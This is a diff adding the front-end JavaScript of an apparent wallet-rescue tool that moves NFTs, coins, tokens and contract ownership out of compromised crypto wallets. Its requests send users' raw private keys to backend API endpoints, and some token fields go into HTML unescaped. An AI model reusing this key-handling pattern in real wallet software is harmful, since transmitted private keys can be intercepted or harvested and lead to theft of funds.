+      const typeBadge = coll.token_type === 'ERC1155' ? '<span class="type-badge type-1155">1155</span>' : '<span class="type-badge type-721">721</span>';
+      
+      html += `<div class="coll-group">
+        <div class="coll-header" onclick="toggleColl('${esc(collKey)}')">
+          <div class="coll-cb ${cbState}" onclick="event.stopPropagation();toggleCollAll('${esc(collKey)}')">${cbMark}</div>
+          <div class="coll-name">${esc(coll.collection)}</div>
+          ${typeBadge}
+          <div class="coll-count">${total}</div>
+          <div class="coll-sel">${selCnt > 0 ? selCnt + ' ✓' : ''}</div>
+          <div class="caret ${isOpen?'open':''}">▶</div>
+        </div>
+        <div class="nft-grid ${isOpen?'open':''} ${STATE.viewMode==='gallery'?'gallery':''}">`;
+      
+      for (const token of coll.tokens) {
+        const k = `${chainId}:${coll.contract}:${token.tokenId}`;
+        const sel = STATE.selected.has(k);
+        const flag = STATE.flagged.has(k);
+        const osLink = `https://opensea.io/assets/${info.key === 'eth' ? 'ethereum' : info.key}/${coll.contract}/${token.tokenId}`;
+        
+        html += `<div class="nft-card ${sel?'selected':''} ${flag?'flagged':''}" id="card-${esc(k)}">
+          <div class="nft-img-wrap" onclick="toggleNFT('${esc(k)}')">
+            <img class="nft-img" src="${token.image||''}" alt="" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect fill=%22%23101a28%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2250%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%235a7a9a%22 font-size=%2210%22>No Image</text></svg>'" />
+            <div class="check-badge">✓</div>
+            ${token.balance > 1 ? `<div class="qty-badge">×${token.balance}</div>` : ''}
+          </div>
+          <div class="nft-info" onclick="toggleNFT('${esc(k)}')">
+            <div class="nft-name">${esc(token.name || 'Token #' + token.tokenId)}</div>
+            <div class="nft-id">#${token.tokenId}</div>
+          </div>
+          <div class="nft-actions">
+            <button class="nft-act ${flag?'flagged':''}" onclick="toggleFlag('${esc(k)}')">${flag?'🚩 flagged':'⚠ flag'}</button>
+            <a class="nft-act" href="${osLink}" target="_blank" onclick="event.stopPropagation()">↗ opensea</a>
+          </div>
+        </div>`;
+      }
+      html += '</div></div>';
+    }
+    html += '</div>';
+  }
+  
+  if (!html) {
+    html = '<div class="empty-state"><div class="empty-icon">⬡</div><div class="empty-title">Nothing matches this filter</div></div>';
+  }
+  
+  content.innerHTML = html;
+  updateStats();
+}
+
+function toggleColl(k) { STATE.openColls.has(k) ? STATE.openColls.delete(k) : STATE.openColls.add(k); renderAll(); }
+
+function toggleChain(chainId) { STATE.closedChains.has(chainId) ? STATE.closedChains.delete(chainId) : STATE.closedChains.add(chainId); renderAll(); }
+
+function toggleCollAll(collKey) {
+  const [chain, contract] = [collKey.split(':')[0], collKey.split(':').slice(1).join(':')];
+  const colls = STATE.nfts[chain];
+  if (!colls) return;
+  const coll = colls.find(c => c.contract === contract);
+  if (!coll) return;
+  const allSel = coll.tokens.every(t => STATE.selected.has(`${chain}:${contract}:${t.tokenId}`));
+  for (const t of coll.tokens) {
+    const k = `${chain}:${contract}:${t.tokenId}`;
+    allSel ? STATE.selected.delete(k) : STATE.selected.add(k);
+  }
+  renderAll();
+  saveSession();
+}
+
+function toggleNFT(k) { STATE.selected.has(k) ? STATE.selected.delete(k) : STATE.selected.add(k); renderAll(); saveSession(); }
+function toggleFlag(k) { STATE.flagged.has(k) ? STATE.flagged.delete(k) : STATE.flagged.add(k); renderAll(); }
+
+function selectAll() { for (const [c,colls] of Object.entries(STATE.nfts)) for (const col of colls) for (const t of col.tokens) STATE.selected.add(`${c}:${col.contract}:${t.tokenId}`); renderAll(); saveSession(); }
+function deselectAll() { STATE.selected.clear(); renderAll(); saveSession(); }
+
+function setFilter(f, btn) { STATE.filter = f; document.querySelectorAll('.ftab').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); renderAll(); }
+function setView(v, btn) { STATE.viewMode = v; document.querySelectorAll('.vtab').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); renderAll(); }
+function doSearch() { STATE.searchQuery = document.getElementById('searchInput').value; renderAll(); }
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// EXPORT / IMPORT
+// ═══════════════════════════════════════════════════════════════════════════════
+function buildRescueData() {
+  const data = { rescue_from: STATE.fromWallet, rescue_to: STATE.toWallet, chains: {} };
+  for (const [chain, colls] of Object.entries(STATE.nfts)) {
+    const filtered = colls.map(c => ({...c, tokens: c.tokens.filter(t => STATE.selected.has(`${chain}:${c.contract}:${t.tokenId}`))})).filter(c => c.tokens.length > 0);
+    if (filtered.length) data.chains[chain] = filtered;
+  }
+  return data;
+}
+
+function exportJSON() {
+  if (!STATE.toWallet) {
+    showModal('📍', 'Destination Required', 'Enter your clean wallet address (TO) before exporting.\n\nYou can scan without it, but the rescue data needs a destination.', [{label:'OK',cls:'btn-primary',fn:closeModal}]);
+    return;
+  }
+  const data = buildRescueData();
+  const blob = new Blob([JSON.stringify(data, null, 2)], {type:'application/json'});
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
+  a.download = `rescue_${STATE.fromWallet.slice(0,10)}_${Date.now()}.json`;
+  a.click(); URL.revokeObjectURL(a.href);
+}
+
+function exportCSV() {
+  let csv = 'chain,contract,collection,tokenId,name,balance\n';
+  for (const [chain, colls] of Object.entries(STATE.nfts)) {
+    for (const c of colls) for (const t of c.tokens) {
+      if (STATE.selected.has(`${chain}:${c.contract}:${t.tokenId}`)) {
+        csv += `${chain},"${c.contract}","${c.collection}",${t.tokenId},"${t.name||''}",${t.balance||1}\n`;
+      }
+    }
+  }
+  const blob = new Blob([csv], {type:'text/csv'});
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
+  a.download = `rescue_${Date.now()}.csv`;
+  a.click(); URL.revokeObjectURL(a.href);
+}
+
+function importJSON() { document.getElementById('fileInput').click(); }
+function handleFileImport(e) {
+  const file = e.target.files[0];
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = (ev) => {
+    try {
+      const data = JSON.parse(ev.target.result);
+      if (data.rescue_from) document.getElementById('fromWallet').value = data.rescue_from;
+      if (data.rescue_to) document.getElementById('toWallet').value = data.rescue_to;
+      STATE.fromWallet = data.rescue_from || '';
+      STATE.toWallet = data.rescue_to || '';
+      STATE.nfts = data.chains || {};
+      STATE.selected.clear();
+      for (const [c,colls] of Object.entries(STATE.nfts)) for (const col of colls) for (const t of col.tokens) STATE.selected.add(`${c}:${col.contract}:${t.tokenId}`);
+      STATE.rescueData = data;
+      onWalletInput();
+      renderAll();
+      document.getElementById('toolbar').style.display = 'flex';
+      document.getElementById('exportRow').style.display = 'flex';
+      document.getElementById('headerStats').style.display = 'flex';
+      saveSession();
+      showModal('✓', 'Import Successful', `Loaded ${STATE.selected.size} NFTs from ${Object.keys(STATE.nfts).length} chains.`, [{label:'OK',cls:'btn-green',fn:closeModal}]);
+    } catch(err) { showModal('✗', 'Import Failed', err.message, [{label:'OK',cls:'btn-ghost',fn:closeModal}]); }
+  };
+  reader.readAsText(file);
+  e.target.value = '';
+}
+
+function sendToLifeboat() {
+  if (!STATE.toWallet) {
+    showModal('📍', 'Destination Required', 'Enter your clean wallet address (TO) before launching.\n\nWe need to know where to send your NFTs.', [{label:'OK',cls:'btn-primary',fn:closeModal}]);
+    return;
+  }
+  STATE.rescueData = buildRescueData();
+  saveSession();
+  showPage('lifeboat', document.getElementById('nav-lifeboat'));
+  loadRescueData();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// LIFEBOAT - NFT RESCUE
+// ═══════════════════════════════════════════════════════════════════════════════
+function loadRescueData() {
+  if (!STATE.rescueData || !Object.keys(STATE.rescueData.chains || {}).length) return;
+  document.getElementById('noDataMsg').style.display = 'none';
+  document.getElementById('rescueDataLoaded').style.display = 'block';
+  
+  const container = document.getElementById('execChainPills');
+  container.innerHTML = '';
+  for (const [jsonKey, colls] of Object.entries(STATE.rescueData.chains)) {
+    const info = CHAIN_INFO[jsonKey];
+    if (!info) continue;
+    const count = colls.reduce((s,c) => s + c.tokens.length, 0);
+    const pill = document.createElement('button');
+    pill.className = 'btn ' + (STATE.execChain === info.key ? 'btn-green' : 'btn-ghost');
+    pill.innerHTML = `${info.name} <span style="opacity:0.7">(${count})</span>`;
+    pill.onclick = () => selectExecChain(info.key, jsonKey);
+    container.appendChild(pill);
+  }
+}
+
+function selectExecChain(chainKey, jsonKey) {
+  STATE.execChain = chainKey;
+  STATE.execJsonKey = jsonKey;
+  document.querySelectorAll('#execChainPills .btn').forEach(b => b.className = 'btn btn-ghost');
+  // Find the button that matches this chain and activate it
+  document.querySelectorAll('#execChainPills .btn').forEach(b => {
+    if (b.textContent.includes(Object.values(CHAIN_INFO).find(c => c.key === chainKey)?.name || '')) b.className = 'btn btn-green';
+  });
+  updateGasEstimate();
+  checkExecuteReady();
+}
+
+function onKeyInput() {
+  KEYS.compromised = document.getElementById('compromisedKey').value.trim() || null;
+  KEYS.funding = document.getElementById('fundingKey').value.trim() || null;
+  document.getElementById('balanceBtn').disabled = !(KEYS.compromised && KEYS.funding);
+  checkExecuteReady();
+}
+
+function checkExecuteReady() {
+  document.getElementById('executeBtn').disabled = !(KEYS.compromised && KEYS.funding && STATE.execChain && STATE.rescueData);
+}
+
+function setGasTier(tier, btn) {
+  STATE.gasTier = tier;
+  document.querySelectorAll('.gas-tier').forEach(t => t.classList.remove('active'));
+  btn.classList.add('active');
+  updateGasEstimate();
+}
+
+async function checkBalances() {
+  if (!KEYS.compromised || !KEYS.funding || !STATE.execChain) return;
+  document.getElementById('balanceBtn').textContent = 'Checking...';
+  document.getElementById('balanceBtn').disabled = true;
+  try {
+    const res = await fetch(API + '/api/balance', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ addresses: [STATE.rescueData.rescue_from, STATE.rescueData.rescue_to], chain: STATE.execChain, alchemyKey: STATE.alchemyKey })
+    });
+    const result = await res.json();
+    if (result.success) {
+      document.getElementById('balanceCard').style.display = 'grid';
+      document.getElementById('balFrom').textContent = result.data.balances[0]?.balance + ' ' + result.data.nativeSymbol;
+      document.getElementById('addrFrom').textContent = shortAddr(STATE.rescueData.rescue_from);
+      document.getElementById('balFund').textContent = result.data.balances[1]?.balance + ' ' + result.data.nativeSymbol;
+      document.getElementById('addrFund').textContent = shortAddr(STATE.rescueData.rescue_to);
+    }
+  } catch(e) { console.error(e); }
+  document.getElementById('balanceBtn').textContent = 'Check Balances';
+  document.getElementById('balanceBtn').disabled = false;
+}
+
+async function updateGasEstimate() {
+  if (!STATE.execChain || !STATE.rescueData || !STATE.execJsonKey) return;
+  try {
+    const mult = STATE.gasTier === 'recommended' ? 1.1 : STATE.gasTier === 'safe' ? 1.25 : 1.5;
+    const res = await fetch(API + '/api/estimate', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ chain: STATE.execChain, rescueData: STATE.rescueData, alchemyKey: STATE.alchemyKey, gasMultiplier: mult })
+    });
+    const result = await res.json();
+    if (result.success) {
+      document.getElementById('gasCard').style.display = 'block';
+      document.getElementById('gasTokens').textContent = result.data.tokenCount;
+      document.getElementById('gasPrice').textContent = result.data.gasPriceGwei + ' gwei';
+      document.getElementById('gasCost').textContent = result.data.totalCostNative + ' ' + result.data.nativeSymbol;
+      document.getElementById('gasMev').textContent = result.data.mevProtected ? '✓ Protected' : 'Standard RPC';
+      document.getElementById('gasMev').style.color = result.data.mevProtected ? 'var(--safe)' : 'var(--warn)';
+    }
+  } catch(e) { console.error(e); }
+}
+
+function confirmExecute() {
+  const info = Object.values(CHAIN_INFO).find(c => c.key === STATE.execChain);
+  const count = STATE.rescueData.chains[STATE.execJsonKey]?.reduce((s,c) => s + c.tokens.length, 0) || 0;
+  showModal('▶', 'Execute Rescue',
+    `<strong>Summary:</strong>\n• ${count} NFTs on ${info?.name || STATE.execChain}\n• From: ${shortAddr(STATE.rescueData.rescue_from)}\n• To: ${shortAddr(STATE.rescueData.rescue_to)}\n• Gas Tier: ${STATE.gasTier}\n\nThis will fund your compromised wallet and transfer all NFTs privately.`,
+    [{label:'Cancel',cls:'btn-ghost',fn:closeModal},{label:'▶ Execute',cls:'btn-green',fn:()=>{closeModal();executeRescue();}}]
+  );
+}
+
+async function executeRescue() {
+  document.getElementById('executeBtn').disabled = true;
+  document.getElementById('executeBtn').textContent = 'Executing...';
+  document.getElementById('progressWrap').style.display = 'block';
+  document.getElementById('execLog').innerHTML = '';
+  document.getElementById('execLog').style.display = 'block';
+  showRescueVideo();
+  
+  log('Starting rescue execution...', 'info');
+  const mult = STATE.gasTier === 'recommended' ? 1.1 : STATE.gasTier === 'safe' ? 1.25 : 1.5;
+  
+  try {
+    const res = await fetch(API + '/api/execute', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        chain: STATE.execChain,
+        rescueData: STATE.rescueData,
+        compromisedKey: KEYS.compromised,
+        fundingKey: KEYS.funding,
+        alchemyKey: STATE.alchemyKey,
+        gasMultiplier: mult
+      })
+    });
+    const result = await res.json();
+    
+    if (result.success) {
+      for (const p of result.data.progressLog || []) {
+        const type = p.error ? 'error' : (p.step === 'complete' ? 'ok' : 'info');
+        log(p.message, type, p.txHash, STATE.execChain);
+        if (p.step === 'funding') { document.getElementById('step1').classList.add('active'); document.getElementById('progressBar').style.width = '33%'; }
+        else if (p.step === 'transferring') { document.getElementById('step1').classList.replace('active','done'); document.getElementById('step2').classList.add('active'); document.getElementById('progressBar').style.width = '66%'; }
+        else if (p.step === 'complete') { document.getElementById('step2').classList.replace('active','done'); document.getElementById('step3').classList.add('done'); document.getElementById('progressBar').style.width = '100%'; }
+      }
+      
+      if (result.data.status === 'complete') {
+        showSuccessModal(result.data.confirmed, STATE.rescueData.rescue_to);
+      }
+    } else {
+      log('✗ ' + (result.error || 'Execution failed'), 'error');
+    }
+  } catch(e) {
+    log('✗ ' + e.message, 'error');
+  }
+  
+  document.getElementById('executeBtn').disabled = false;
+  document.getElementById('executeBtn').textContent = '▶ Execute Rescue';
+}
+
+function showSuccessModal(count, dest) {
+  const checklist = `<div class="success-checklist">
+    <div class="checklist-title">🚢 Your lifeboats have reached safety</div>
+    <div class="checklist-item"><span class="checklist-check">✓</span> Delete your private keys from this tool NOW</div>
+    <div class="checklist-item"><span class="checklist-check">✓</span> Never use the compromised wallet again</div>
+    <div class="checklist-item"><span class="checklist-check" style="color:var(--accent);">⚠</span> <span style="color:var(--accent);">Sweep your change — if you leave a penny, they will take a penny.</span> Go to Native Sweep and sweep any leftover ETH to your clean wallet.</div>
+    <div class="checklist-item"><span class="checklist-check">✓</span> Consider a hardware wallet for your new collection</div>
+  </div>`;
+  showModal('🎉', 'Rescue Complete!',
+    `<strong>${count} NFTs</strong> confirmed at ${shortAddr(dest)}`,
+    [{label:'🔥 Clear & Close',cls:'btn-fire',fn:()=>{closeModal();burnSession();}}],
+    checklist
+  );
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// NATIVE BALANCE DASHBOARD
+// ═══════════════════════════════════════════════════════════════════════════════
+function checkSweepKeyReady() {
+  const key = document.getElementById('sweepKey').value.trim();
+  // Address or key is enough to enable scan — dest only required at sweep time
+  document.getElementById('scanBalancesBtn').disabled = !(key.length >= 10);
+}
+
+async function scanAllBalances() {
+  const keyOrAddr = document.getElementById('sweepKey').value.trim();
+  const dest = document.getElementById('sweepDest').value.trim();
+  if (!keyOrAddr) return;
+
+  // Determine if it's a public address (read-only) or private key
+  const isAddress = keyOrAddr.startsWith('0x') && keyOrAddr.length === 42;
+
+  document.getElementById('scanBalancesBtn').disabled = true;
+  document.getElementById('scanBalancesBtn').textContent = '⬡ Scanning...';
+  document.getElementById('balanceDashboard').style.display = 'block';
+  document.getElementById('balanceRows').innerHTML = '<div style="padding:16px;text-align:center;color:var(--text3);font-size:0.65rem;">Checking all chains...</div>';
+
+  const chains = [
+    { key: 'eth', name: 'Ethereum', color: '#627eea', symbol: 'ETH', mev: true },
+    { key: 'polygon', name: 'Polygon', color: '#8247e5', symbol: 'POL', mev: false },
+    { key: 'base', name: 'Base', color: '#0052ff', symbol: 'ETH', mev: false },
+    { key: 'optimism', name: 'Optimism', color: '#ff0420', symbol: 'ETH', mev: false },
+    { key: 'avalanche', name: 'Avalanche', color: '#e84142', symbol: 'AVAX', mev: false },
+  ];
+
+  const body = isAddress
+    ? { address: keyOrAddr, alchemyKey: STATE.alchemyKey }
+    : { privateKey: keyOrAddr, alchemyKey: STATE.alchemyKey };
+
+  try {
+    const res = await fetch(API + '/api/balances-all', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(body)
+    });
+    const result = await res.json();
+    if (!result.success) throw new Error(result.error || 'Balance check failed');
+
+    let html = '';
+    for (const bal of result.data.balances) {
+      const chain = chains.find(c => c.key === bal.chain);
+      if (!chain) continue;
+      const isZero = parseFloat(bal.balance) === 0;
+      // Sweep requires private key — disable if only an address was provided
+      const canSweep = parseFloat(bal.balance) > 0 && !isAddress;
+      const sweepTitle = isAddress ? 'title="Enter private key to enable sweep"' : '';
+
+      html += `<div class="dash-row">
+        <div class="dash-chain-dot" style="background:${chain.color}"></div>
+        <div class="dash-chain-name">${chain.name}</div>
+        <div class="dash-balance ${isZero?'zero':''}">${parseFloat(bal.balance).toFixed(6)}</div>
+        <div class="dash-symbol">${chain.symbol}</div>
+        ${chain.mev ? '<div class="dash-mev">🛡 MEV</div>' : '<div style="min-width:44px"></div>'}
+        <button class="dash-sweep-btn" id="sweep-${chain.key}" ${canSweep?'':'disabled'} ${sweepTitle} onclick="sweepChain('${chain.key}','${chain.name}','${chain.symbol}')">▶ Sweep</button>
+        <div class="dash-status" id="sweep-status-${chain.key}">${isAddress && !isZero ? '<span style="color:var(--accent);font-size:0.58rem;">key needed to sweep</span>' : ''}</div>
+      </div>`;
+    }
+    document.getElementById('balanceRows').innerHTML = html || '<div style="padding:12px;text-align:center;color:var(--text3);">No balances found</div>';
+
+    if (isAddress) {
+      const note = document.createElement('div');
+      note.style.cssText = 'padding:10px 12px;font-size:0.6rem;color:var(--text3);border-top:1px solid var(--border);';
+      note.textContent = 'Read-only scan — enter your private key above to enable sweeping.';
+      document.getElementById('balanceRows').appendChild(note);
+    }
+  } catch(e) {
+    document.getElementById('balanceRows').innerHTML = `<div style="padding:12px;text-align:center;color:var(--danger);font-size:0.65rem;">Error: ${esc(e.message)}</div>`;
+  }
+
+  document.getElementById('scanBalancesBtn').disabled = false;
+  document.getElementById('scanBalancesBtn').textContent = '⬡ Scan All Balances';
+}
+
+async function sweepChain(chainKey, chainName, symbol) {
+  const key = document.getElementById('sweepKey').value.trim();
+  const dest = document.getElementById('sweepDest').value.trim();
+  const btn = document.getElementById('sweep-' + chainKey);
+  const status = document.getElementById('sweep-status-' + chainKey);
+
+  btn.disabled = true;
+  btn.textContent = 'Sweeping...';
+  status.style.color = 'var(--accent3)';
+  status.textContent = 'sending...';
+
+  try {
+    const res = await fetch(API + '/api/sweep', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ fromKey: key, toAddress: dest, chain: chainKey, alchemyKey: STATE.alchemyKey })
+    });
+    const result = await res.json();
+    if (result.success) {
+      btn.textContent = '✓ Done';
+      btn.className = 'dash-sweep-btn done';
+      status.style.color = 'var(--safe)';
+      status.textContent = result.data.amount + ' ' + symbol;
+    } else throw new Error(result.error);
+  } catch(e) {
+    btn.textContent = '▶ Retry';
+    btn.disabled = false;
+    status.style.color = 'var(--danger)';
+    status.textContent = e.message.slice(0, 40);
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// ERC-20 TOKEN SWEEP
+// ═══════════════════════════════════════════════════════════════════════════════
+function checkTokenSweepReady() {
+  const key = document.getElementById('tokenKey').value.trim();
+  const dest = document.getElementById('tokenDest').value.trim();
+  document.getElementById('scanTokensBtn').disabled = !(key && dest);
+}
+
+async function scanTokens() {
+  const key = document.getElementById('tokenKey').value.trim();
+  const dest = document.getElementById('tokenDest').value.trim();
+  if (!key || !dest) return;
+
+  document.getElementById('scanTokensBtn').disabled = true;
+  document.getElementById('scanTokensBtn').textContent = '🪙 Scanning...';
+  document.getElementById('tokenDashboard').style.display = 'block';
+  document.getElementById('tokenRows').innerHTML = '<div style="padding:16px;text-align:center;color:var(--text3);font-size:0.65rem;">Scanning all chains for ERC-20 tokens...</div>';
+
+  try {
+    const res = await fetch(API + '/api/tokens', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ privateKey: key, alchemyKey: STATE.alchemyKey })
+    });
+    const result = await res.json();
+    if (!result.success) throw new Error(result.error || 'Token scan failed');
+
+    const chainColors = { eth: '#627eea', polygon: '#8247e5', base: '#0052ff', optimism: '#ff0420', avalanche: '#e84142' };
+    let html = '';
+    let totalTokens = 0;
+
+    for (const token of result.data.tokens) {
+      if (parseFloat(token.balance) === 0) continue;
+      totalTokens++;
+      html += `<div class="dash-row">
+        <div class="dash-chain-dot" style="background:${chainColors[token.chain] || '#666'}"></div>
+        <div class="dash-token-name" title="${esc(token.contract)}">${esc(token.symbol || token.name || 'Unknown')}</div>
+        <div class="dash-balance">${parseFloat(token.balance).toFixed(6)}</div>
+        <div class="dash-chain-name" style="min-width:70px;font-size:0.6rem;color:var(--text3);">${token.chainName}</div>
+        <button class="dash-sweep-btn" id="tsweep-${token.chain}-${totalTokens}" onclick="sweepToken('${token.chain}','${esc(token.contract)}','${esc(token.symbol)}',this)">▶ Sweep</button>
+        <div class="dash-status" id="tsweep-status-${token.chain}-${totalTokens}"></div>
+      </div>`;
+    }
+
+    if (!html) {
+      html = '<div style="padding:16px;text-align:center;color:var(--text3);font-size:0.65rem;">No ERC-20 tokens found with balances.</div>';
+    }
+    document.getElementById('tokenRows').innerHTML = html;
+  } catch(e) {
+    document.getElementById('tokenRows').innerHTML = `<div style="padding:12px;text-align:center;color:var(--danger);font-size:0.65rem;">Error: ${esc(e.message)}</div>`;
+  }
+
+  document.getElementById('scanTokensBtn').disabled = false;
+  document.getElementById('scanTokensBtn').textContent = '🪙 Scan All Chains for Tokens';
+}
+
+async function sweepToken(chainKey, contract, symbol, btn) {
+  const key = document.getElementById('tokenKey').value.trim();
+  const dest = document.getElementById('tokenDest').value.trim();
+  const statusEl = btn.parentElement.querySelector('.dash-status');
+
+  btn.disabled = true;
+  btn.textContent = 'Sweeping...';
+  statusEl.style.color = 'var(--accent3)';
+  statusEl.textContent = 'sending...';
+
+  try {
+    const res = await fetch(API + '/api/sweep-token', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ fromKey: key, toAddress: dest, chain: chainKey, tokenContract: contract, alchemyKey: STATE.alchemyKey })
+    });
+    const result = await res.json();
+    if (result.success) {
+      btn.textContent = '✓ Done';
+      btn.className = 'dash-sweep-btn done';
+      statusEl.style.color = 'var(--safe)';
+      statusEl.textContent = result.data.amount + ' ' + symbol;
+    } else throw new Error(result.error);
+  } catch(e) {
+    btn.textContent = '▶ Retry';
+    btn.disabled = false;
+    statusEl.style.color = 'var(--danger)';
+    statusEl.textContent = e.message.slice(0, 40);
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// MANIFOLD
+// ═══════════════════════════════════════════════════════════════════════════════
+function checkManifoldReady() {
+  const contract = document.getElementById('manifoldContract').value.trim();
+  const key = document.getElementById('manifoldFromKey').value.trim();
+  const newOwner = document.getElementById('manifoldNewOwner').value.trim();
+  document.getElementById('manifoldBtn').disabled = !(contract && key && newOwner);
+}
+
+function confirmManifold() {
+  const contract = document.getElementById('manifoldContract').value.trim();
+  const newOwner = document.getElementById('manifoldNewOwner').value.trim();
+  showModal('◎', 'Transfer Ownership',
+    `Manifold contract ${shortAddr(contract)} ownership will transfer to ${shortAddr(newOwner)} via MEV Blocker.\n\nAfter this, connect your clean wallet to app.manifold.xyz to add admin and set royalties.`,
+    [{label:'Cancel',cls:'btn-ghost',fn:closeModal},{label:'▶ Transfer',cls:'btn-green',fn:()=>{closeModal();executeManifold();}}]
+  );
+}
+
+async function executeManifold() {
+  const status = document.getElementById('manifoldStatus');
+  const contract = document.getElementById('manifoldContract').value.trim();
+  const key = document.getElementById('manifoldFromKey').value.trim();
+  const newOwner = document.getElementById('manifoldNewOwner').value.trim();
+  
+  status.style.color = 'var(--accent3)';
+  status.textContent = 'Executing transfer...';
+  document.getElementById('manifoldBtn').disabled = true;
+  
+  try {
+    const res = await fetch(API + '/api/manifold', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ contractAddress: contract, newOwner, privateKey: key, alchemyKey: STATE.alchemyKey })
+    });
+    const result = await res.json();
+    if (result.success) {
+      status.style.color = 'var(--safe)';
+      status.textContent = '✓ Ownership transferred. Connect clean wallet to app.manifold.xyz to add admin.';
+    } else throw new Error(result.error);
+  } catch(e) {
+    status.style.color = 'var(--danger)';
+    status.textContent = '✗ ' + e.message;
+  }
+  document.getElementById('manifoldBtn').disabled = false;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// BURN
+// ═══════════════════════════════════════════════════════════════════════════════
+function confirmBurn() {
+  showModal('🔥', 'Clear All Session Data',
+    'This will:\n• Wipe private keys from memory\n• Clear all form fields\n• Reset scan results\n• Remove saved session\n\nYour keys were never stored on disk.',
+    [{label:'Cancel',cls:'btn-ghost',fn:closeModal},{label:'🔥 Burn It',cls:'btn-fire',fn:()=>{closeModal();burnSession();}}]
+  );
+}
+
+function burnSession() {
+  KEYS.compromised = null;
+  KEYS.funding = null;
+  STATE.fromWallet = '';
+  STATE.toWallet = '';
+  STATE.alchemyKey = '';
+  STATE.nfts = {};
+  STATE.selected.clear();
+  STATE.flagged.clear();
+  STATE.openColls.clear();
+  STATE.rescueData = null;
+  STATE.execChain = null;
+  
+  localStorage.removeItem('lifeboat_session');
+  document.querySelectorAll('input').forEach(i => i.value = '');
+  document.getElementById('content').innerHTML = '<div class="empty-state"><div class="empty-icon">🔥</div><div class="empty-title">Session Cleared</div><div class="empty-sub">All data wiped from memory. Your keys were never stored.</div></div>';
+  document.getElementById('toolbar').style.display = 'none';
+  document.getElementById('exportRow').style.display = 'none';
+  document.getElementById('headerStats').style.display = 'none';
+  document.getElementById('walletDisplay').classList.remove('show');
+  document.getElementById('balanceCard').style.display = 'none';
+  document.getElementById('gasCard').style.display = 'none';
+  document.getElementById('progressWrap').style.display = 'none';
+  document.getElementById('execLog').style.display = 'none';
+  document.getElementById('noDataMsg').style.display = 'flex';
+  document.getElementById('rescueDataLoaded').style.display = 'none';
+  // Clear new dashboards
+  const bd = document.getElementById('balanceDashboard');
+  if (bd) bd.style.display = 'none';
+  const td = document.getElementById('tokenDashboard');
+  if (td) td.style.display = 'none';
+  hideRescueVideo();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// EMBLEM VAULT
+// ═══════════════════════════════════════════════════════════════════════════════
+const EMBLEM_V2 = '0x82C7a8f707110f5FBb16184A5933E9F78a34c6ab';
+const EMBLEM_LEGACY = '0x6Fc355D4e0EE44b292E50878F49798ff755A5bbC';
+let emblemVaults = [];
+let emblemSelected = new Set();
+
+function checkEmblemScanReady() {
+  const w = document.getElementById('emblemWallet').value.trim();
+  document.getElementById('emblemScanBtn').disabled = !w;
+}
+
+function checkEmblemExecReady() {
+  const k1 = document.getElementById('emblemCompromisedKey').value.trim();
+  const k2 = document.getElementById('emblemFundingKey').value.trim();
+  const dest = document.getElementById('emblemDest').value.trim();
+  const hasSelected = emblemSelected.size > 0;
+  document.getElementById('emblemExecBtn').disabled = !(k1 && k2 && dest && hasSelected);
+}
+
+async function emblemScan() {
+  const wallet = document.getElementById('emblemWallet').value.trim();
+  const alchemyKey = document.getElementById('emblemAlchemyKey').value.trim() || STATE.alchemyKey;
+  if (!wallet) return;
+  if (!alchemyKey) {
+    showModal('⚠', 'Alchemy Key Required', 'Enter your Alchemy API key in the field above, or set it in the Rescue tab first.', [{label:'OK',cls:'btn-ghost',fn:closeModal}]);
+    return;
+  }
+
+  document.getElementById('emblemScanBtn').disabled = true;
+  document.getElementById('emblemScanBtn').textContent = '🔒 Scanning...';
+
+  try {
+    const res = await fetch(API + '/api/emblem/scan', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ wallet, alchemyKey })
+    });
+    const result = await res.json();
+    if (!result.success) throw new Error(result.error || 'Scan failed');
+
+    emblemVaults = result.data.vaults;
+    emblemSelected = new Set(emblemVaults.map((v, i) => i));
+
+    if (emblemVaults.length === 0) {
+      document.getElementById('emblemResults').style.display = 'none';
+      showModal('📦', 'No Vaults Found', 'No Emblem Vault NFTs found in this wallet on Ethereum mainnet.', [{label:'OK',cls:'btn-ghost',fn:closeModal}]);
+    } else {
+      document.getElementById('emblemResults').style.display = 'block';
+      renderEmblemVaults();
+    }
+  } catch(e) {
+    showModal('✗', 'Scan Error', esc(e.message), [{label:'OK',cls:'btn-ghost',fn:closeModal}]);
+  }
+
+  document.getElementById('emblemScanBtn').disabled = false;
+  document.getElementById('emblemScanBtn').textContent = '🔒 Scan for Emblem Vaults';
+}
+
+function renderEmblemVaults() {
+  const container = document.getElementById('emblemVaultRows');
+  if (emblemVaults.length === 0) {
+    container.innerHTML = '<div style="padding:12px;color:var(--text3);font-size:0.6rem;">No vaults found.</div>';
+    return;
+  }
+
+  let html = '';
+  emblemVaults.forEach((v, i) => {
+    const checked = emblemSelected.has(i) ? 'checked' : '';
+    const isLegacy = v.contract.toLowerCase() === EMBLEM_LEGACY.toLowerCase();
